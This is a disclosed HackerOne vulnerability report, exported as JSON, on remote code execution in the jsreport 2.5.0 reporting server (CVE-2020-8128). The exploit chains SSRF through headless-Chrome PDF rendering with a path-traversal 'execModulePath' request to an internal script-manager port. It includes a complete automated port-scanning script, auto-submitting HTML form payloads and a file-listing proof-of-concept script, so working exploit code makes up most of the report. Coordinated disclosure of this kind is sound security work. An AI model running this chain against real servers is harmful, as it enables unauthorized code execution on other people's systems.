{"id":660565,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjA1NjU=","url":"https://hackerone.com/reports/660565","title":"[jsreport] Remote Code Execution","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-07-26T05:00:15.970Z","submitted_at":"2019-07-26T05:00:15.970Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ermilov","url":"/ermilov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8128"],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-07T15:24:08.771Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-02-07T15:23:15.619Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report Remote Code Execution in `jsreport`\nIt allows running js files remotely on a vulnerable server.\n\n# Module\n\n**module name:** jsreport\n**version:** 2.5.0\n**npm page:** `https://www.npmjs.com/package/jsreport`\n\n## Module Description\n\njsreport is a reporting server which lets developers define reports using javascript templating engines (like jsrender or handlebars). It supports various report output formats like html, pdf, excel and others. It also includes advanced reporting features like user management, REST API, scheduling, designer or sending emails.\n\n## Module Stats\n\n52 downloads in the last day\n2056 downloads in the last week\n6428 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n`jsreport` consists of a variety of packages which combines in one working application. `Script-manager` is one of them, it is utilized for running user's scripts in a sandbox and has an `unintended require` vulnerability (I have a separate report describing this vulnerability) which allows an attacker to load code that was not intended to execute. Another module is `Puppeteer` which is headless Chrome Node API. The application uses it for turning user's HTML into pdf files and unfortunately, the way it is applied allows fetching URLs and sending requests defined in an HTML file by a user which is known as SSRF (Server Side Request Forgery). Chaining these two vulnerabilities (Unintended require + SSRF) leads to remote code execution possibility.\n\n**SSRF:**\nSSRF itself is quite simple, generating a pdf report from an HTML template like this one:\n\n    \u003chtml\u003e\n    \u003chead\u003e\n        \u003cmeta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n    \t\t\u003c!-- will send GET request to example.com --\u003e\n        \u003cimg src=\"http://example.com/\" /\u003e\n    \t\t\u003c!-- will send POST request to example.com --\u003e\n    \t\t\u003cform id=\"pwn-form\" method=\"POST\" action=\"http://example.com/action\"\u003e\n            \u003cinput type=\"hidden\" name='SomeField' value='Some Value' /\u003e\n        \u003c/form\u003e\n        \u003cscript\u003e\n            var form = document.getElementById(\"pwn-form\");\n            form.submit();\n        \u003c/script\u003e\n    \u003c/body\u003e\n    \u003c/html\u003e\n    \n\nwill perform requests from the server to example.com (GET and POST according to examples)\n@@ pictures\n\n**Unintended require:**\n\nA detailed description of this bug can be found here #660563. The main idea of this vulnerability is that a separate server is running on a randomly chosen port and as long as we found out the port it is possible to send a request with the path to any script (located on the machine) that we want to execute.\n\nrequest example:\n\n    {\"options\": {\"rid\": 12, \"execModulePath\": \"./../../../pwn.js\"}}\n\n**How to find port:**\n\nIn order to exploit `script-manager` we can scan ports on the server which runs `jsreport`, by utilizing SSRF (discussed previously). To do it you should create an HTML template which sends an HTTP request to port you would like to check and render it as a pdf in the application. It is easy to distinguish result as long as the response is printed to the pdf output. Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes.\n\nFirst of all, it is possible to do many requests with one HTML page and by checking the output figure out which range of ports includes the one we look for. \n\nNext helpful thing is the usage of `Debug` mode, if you render the HTML template in Debug mode it returns the output from server log instead of pdf page itself. It saves time and gives a better understanding of what is happening server-side. So by sending a wrong request, you see the output like this:\n\n    Failed to load resource: net::ERR_CONNECTION_REFUSED\n\nif we send a request to the port we are looking for a response would be like this:\n\n    Failed to load resource: the server responded with a status of 500 (Internal Server Error)\n\nin other words, there will be an error in the server response\nand script-manager will restart the child server.\n\nHere is another trick: if we send requests too fast and do it before the child server starts again we get a very informative error in debug log:\n\n     Executing script test1 Error: connect ECONNREFUSED 127.0.0.1:39499\n\nHere we go: this is the needed port.\n\nIt is actually quite easy to automate these requests and create a script that will do all the work for you.\n\nThe final algorithm is:\n\n1. run huge chunks of ports (I guess 1000 ports at a time is good)\n2. when we hit an error, try to run requests again and see if we lucky to get the port number in the error's output.\n3. if not we just split the range of ports in two halves and repeat steps 1 and 2 on both (divide and conquer approach)\n4. in the end we find an error or distinguish the final port by narrowing down the range of ports to the one.\n\n**RCE Steps:**\n\n1. Find out the port of `script-manager`'s vulnerable server by utilizing SSRF in `jsreport` (and automation :))\n2. Use `jsreport` to create a js file that will be stored on the machine and which content will be executed on the server.\n3. Use SSRF again to send a crafted request to `script-manager`'s vulnerable server and make it execute our file.\n4. Done! We executed a user created js file on the server.\n\nF539728\n\n## Steps To Reproduce:\n\n- run `jsreport`, easiest way to do it is to run it as a docker container\n\n    sudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0\n\n- go to [http://localhost](http://localhost) (or address to server where docker is running) in your browser\n- create new template and name it 'test1'\n\nF539730\n\nF539731\n\n- write some HTML to it (e.g. ```\u003ch1\u003ehello world\u003c/h1\u003e```) and click 'Save'\n\nF539742\n\n- create portScanner.js localy (outside docker container)\n\nportScanner.js\n\n    const request = require('request')\n    \n    const name = process.argv[2] // name of the template\n    const id = process.argv[3] // id of the template\n    const chunkSize = 1000\n    const jrUrl = process.argv[4]\n      ? `${process.argv[4]}/api/report/${name}` // jsreport url if it is different from localhost\n      : `http://localhost/api/report/${name}`\n    \n    function requestPromise(options) {\n      return new Promise((resolve, reject) =\u003e {\n        request.post(options, function optionalCallback(err, httpResponse, body) {\n          if (err) {\n            return reject(err)\n          }\n          resolve(body)\n        });\n      })\n    }\n    \n    async function checkPorts(start, finish) {\n      let content = `\n      \u003chtml\u003e\n        \u003cbody\u003e\n          \u003cscript\u003e\n            function printImg(port) {\n              var url = 'http://localhost:' + port;\n              var resultDiv = document.getElementById('result');\n              var img = document.createElement('img');\n              img.src = url;\n            }\n            var ports = [];\n            var start = ${start};\n            var finish = ${finish};\n            for (var i = start; i \u003c= finish; i++) ports.push(i);\n            ports.forEach(function(port) {\n              printImg(port);\n            })\n          \u003c/script\u003e\n        \u003c/body\u003e\n      \u003c/html\u003e\n      `\n      const formData = {\n        template: {\n          name: name,\n          recipe: 'chrome-pdf',\n          shortid: id,\n          __entitySet: 'templates',\n          __name: name,\n          engine: 'handlebars',\n          chrome: {printBackground: 'true'},\n          content: content,\n          __isLoaded: 'true',\n          __recipe: 'chrome-pdf',\n          __shortid: id,\n          __isDirty: 'false'\n        },\n        options: {\n          debug: {\n            logsToResponse: 'true'\n          },\n          preview: 'true'\n        }\n      }\n    \n      const body = await requestPromise({url: jrUrl, form: formData})\n      if (body.indexOf('connect ECONNREFUSED 127.0.0.1:') \u003e -1) {\n        const rgx = /connect ECONNREFUSED 127.0.0.1:(\\d*)/g\n        const match = rgx.exec(body)\n        console.log('match', match)\n        return match[1] || true\n      } else if (body.indexOf('Failed to load resource: the server responded with a status of 500 (Internal Server Error)') \u003e -1) {\n        return true\n      } else \n      return false\n    }\n    \n    // checking ports by `divide and conquer` approach\n    // which means checking a huge chunk of ports at once an then narrowing down till we hit the only possible port\n    // takes about 16 iterations to figure it out\n    // anyway its faster then manually checking 65k ports\n    async function checker(start, finish) {\n      const rp = await checkPorts(start, finish)\n      if (rp) {\n        if (typeof rp === 'string') { // string is returned when port is extracted from an error message\n          return rp\n        } else if (start === finish) {\n          return start\n        } else {\n          const middle = Math.floor((finish + start) / 2)\n          const tmp1 = await checker(start, middle)\n          const tmp2 = await checker(middle+1, finish)\n          return tmp1 || tmp2\n        }\n      }\n    }\n    \n    (async function main(){\n      // ports range\n      const start = 1024\n      const finish = 65535\n    \n      // split ports range into chunks of 1000\n      let first = start\n      let last = start + 1000\n    \n      let stopEnum = false\n      while (!stopEnum) {\n        if ( last \u003e finish ) {\n          last = finish\n          stopEnum = true\n        }\n        // checking every port from `first` to `last`\n        const result = await checker(first, last)\n        if (result) {\n          console.log(result);\n          return;\n        }\n        first = last + 1\n        last = first + 1000\n      }\n    })()\n\n- run portScanner.js\n\n    node portScanner.js **test1** **templateId**\n\nwhere **test1** - name of the template (actually 'test1' that we created previously)\n\n**templateId** - id of the template (may be extracted from the temlates URL)\n\nF539733\n\ne.g. node portScanner.js test1 BJe2Pi2AgB\n\nif you don't run docker on [localhost](http://localhost) you may add docker's address as a 3rd parameter (check portScanner.js code for clarity)\n\ne.g http://my-jsreport-addr.app\n\n    node portScanner.js test1 id_from_jsreport http://my-jsreport-addr.app\n\n- wait untill it finishes and logs the port number\n\nF539741\n\n- then create a new script in `jsreport` and name it 'pwn.js'\n\nF539734\n\nF539735\n\nthis script we will be able to execute on the server\n\nso for demonstration purposes source code is:\n\n    console.log('PWNED')\n    var ls = require('fs').readdirSync('./')\n    console.log(ls)\n\nthe idea is to list files in the application root directory\n\n- insert this source code into pwn.js\n\nF539736\n\n- create new template 'test2'\n\nF539737\n\n- insert HTML code which will exploit the `script-manager` (change xxxx for the value of the previously found script-manager's port) and click `Save`\n\n\u003e don't forget to put the right port into code snippet\n\n    \u003chtml\u003e\n    \u003chead\u003e\n        \u003cmeta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        123 \u003cimg src=x /\u003e\n    \t\t\u003c!-- xxxx is the scipt-manager's port --\u003e\n        \u003cform id=\"pwn-form\" enctype=\"text/plain\" method=\"POST\" action=\"http://localhost:xxxx/\"\u003e\n            \u003cinput type=\"hidden\" name='{\"test' value='\":1, \"options\": {\"rid\": 12, \"execModulePath\": \"./../../../data/pwn.js/content.js\"}}' /\u003e\n        \u003c/form\u003e\n        \u003cscript\u003e\n            var form = document.getElementById(\"pwn-form\");\n            form.submit();\n        \u003c/script\u003e\n    \u003c/body\u003e\n    \u003c/html\u003e\n\nF539738\n\n- then click `Run` (don't forget aboud 'chrome-pdf' mode)\n\nF539739\n\n- you will see an error message as an output and result of 'pwn.js' logged to console on the server\n\nF539740\n\n## Patch\n\n## Supporting Material/References:\n\n- OS: Linux Mint current\n- Node.js: 10.16.0\n- NPM: 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn attacker is able to create and execute js code on the server","vulnerability_information_html":"\u003cp\u003eI would like to report Remote Code Execution in \u003ccode\u003ejsreport\u003c/code\u003e\u003cbr\u003e\nIt allows running js files remotely on a vulnerable server.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e jsreport\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 2.5.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/jsreport\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003ejsreport is a reporting server which lets developers define reports using javascript templating engines (like jsrender or handlebars). It supports various report output formats like html, pdf, excel and others. It also includes advanced reporting features like user management, REST API, scheduling, designer or sending emails.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e52 downloads in the last day\u003cbr\u003e\n2056 downloads in the last week\u003cbr\u003e\n6428 downloads in the last month\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003ejsreport\u003c/code\u003e consists of a variety of packages which combines in one working application. \u003ccode\u003eScript-manager\u003c/code\u003e is one of them, it is utilized for running user\u0026#39;s scripts in a sandbox and has an \u003ccode\u003eunintended require\u003c/code\u003e vulnerability (I have a separate report describing this vulnerability) which allows an attacker to load code that was not intended to execute. Another module is \u003ccode\u003ePuppeteer\u003c/code\u003e which is headless Chrome Node API. The application uses it for turning user\u0026#39;s HTML into pdf files and unfortunately, the way it is applied allows fetching URLs and sending requests defined in an HTML file by a user which is known as SSRF (Server Side Request Forgery). Chaining these two vulnerabilities (Unintended require + SSRF) leads to remote code execution possibility.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSSRF:\u003c/strong\u003e\u003cbr\u003e\nSSRF itself is quite simple, generating a pdf report from an HTML template like this one:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/html; charset=utf-8\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp-equiv=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Content-Type\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"c\"\u003e\u0026lt;!-- will send GET request to example.com --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://example.com/\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"c\"\u003e\u0026lt;!-- will send POST request to example.com --\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pwn-form\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://example.com/action\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;SomeField\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Some Value\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eform\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epwn-form\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewill perform requests from the server to example.com (GET and POST according to examples)\u003cbr\u003e\n@@ pictures\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eUnintended require:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eA detailed description of this bug can be found here \u003ca href=\"/reports/660563\"\u003e#660563\u003c/a\u003e. The main idea of this vulnerability is that a separate server is running on a randomly chosen port and as long as we found out the port it is possible to send a request with the path to any script (located on the machine) that we want to execute.\u003c/p\u003e\n\n\u003cp\u003erequest example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;options\u0026quot;: {\u0026quot;rid\u0026quot;: 12, \u0026quot;execModulePath\u0026quot;: \u0026quot;./../../../pwn.js\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eHow to find port:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eIn order to exploit \u003ccode\u003escript-manager\u003c/code\u003e we can scan ports on the server which runs \u003ccode\u003ejsreport\u003c/code\u003e, by utilizing SSRF (discussed previously). To do it you should create an HTML template which sends an HTTP request to port you would like to check and render it as a pdf in the application. It is easy to distinguish result as long as the response is printed to the pdf output. Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes.\u003c/p\u003e\n\n\u003cp\u003eFirst of all, it is possible to do many requests with one HTML page and by checking the output figure out which range of ports includes the one we look for. \u003c/p\u003e\n\n\u003cp\u003eNext helpful thing is the usage of \u003ccode\u003eDebug\u003c/code\u003e mode, if you render the HTML template in Debug mode it returns the output from server log instead of pdf page itself. It saves time and gives a better understanding of what is happening server-side. So by sending a wrong request, you see the output like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eFailed to load resource: net::ERR_CONNECTION_REFUSED\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eif we send a request to the port we are looking for a response would be like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eFailed to load resource: the server responded with a status of 500 (Internal Server Error)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ein other words, there will be an error in the server response\u003cbr\u003e\nand script-manager will restart the child server.\u003c/p\u003e\n\n\u003cp\u003eHere is another trick: if we send requests too fast and do it before the child server starts again we get a very informative error in debug log:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e Executing script test1 Error: connect ECONNREFUSED 127.0.0.1:39499\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere we go: this is the needed port.\u003c/p\u003e\n\n\u003cp\u003eIt is actually quite easy to automate these requests and create a script that will do all the work for you.\u003c/p\u003e\n\n\u003cp\u003eThe final algorithm is:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003erun huge chunks of ports (I guess 1000 ports at a time is good)\u003c/li\u003e\n\u003cli\u003ewhen we hit an error, try to run requests again and see if we lucky to get the port number in the error\u0026#39;s output.\u003c/li\u003e\n\u003cli\u003eif not we just split the range of ports in two halves and repeat steps 1 and 2 on both (divide and conquer approach)\u003c/li\u003e\n\u003cli\u003ein the end we find an error or distinguish the final port by narrowing down the range of ports to the one.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eRCE Steps:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eFind out the port of \u003ccode\u003escript-manager\u003c/code\u003e\u0026#39;s vulnerable server by utilizing SSRF in \u003ccode\u003ejsreport\u003c/code\u003e (and automation :))\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003ejsreport\u003c/code\u003e to create a js file that will be stored on the machine and which content will be executed on the server.\u003c/li\u003e\n\u003cli\u003eUse SSRF again to send a crafted request to \u003ccode\u003escript-manager\u003c/code\u003e\u0026#39;s vulnerable server and make it execute our file.\u003c/li\u003e\n\u003cli\u003eDone! We executed a user created js file on the server.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"jsreport_scheme_(1).png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/728/4bcef07d8c457b011505e36657e313300500c3c4/jsreport_scheme_%281%29.png?response-content-disposition=attachment%3B%20filename%3D%22jsreport_scheme_%25281%2529.png%22%3B%20filename%2A%3DUTF-8%27%27jsreport_scheme_%25281%2529.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=c488a7abce1d2c5d1344d3193b931fb4b1d96c3706d5174c489cdaf0772f1832\" data-attachment-type=\"image/png\"\u003ejsreport_scheme_(1).png (F539728)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003erun \u003ccode\u003ejsreport\u003c/code\u003e, easiest way to do it is to run it as a docker container\u003c/p\u003e\n\n\u003cp\u003esudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ego to \u003ca href=\"/redirect?url=http%3A%2F%2Flocalhost\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (or address to server where docker is running) in your browser\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ecreate new template and name it \u0026#39;test1\u0026#39;\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/730/d3baa0eba2551bb8141ff0772cf04c0933fdb684/screen1.png?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=a83ae55ed2a5a54748c0c8962fce9d53c69f6f246013cfe275c92564d05d9818\" data-attachment-type=\"image/png\"\u003escreen1.png (F539730)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen2.png\" 